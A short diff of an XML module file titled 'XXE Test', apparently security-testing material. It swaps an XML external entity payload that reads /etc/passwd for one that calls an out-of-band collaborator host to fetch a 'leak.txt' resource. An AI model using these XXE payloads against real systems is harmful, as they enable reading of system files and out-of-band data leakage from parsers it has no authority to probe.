@@ -1,5 +1,7 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://moen0b6wf6zzs8gbs6ah7u8ai1orcg.oastify.com/leak.txt">
+]>
 <Module>
   <ModulePrefs title="XXE Test"/>
   <Content type="html"><![CDATA[
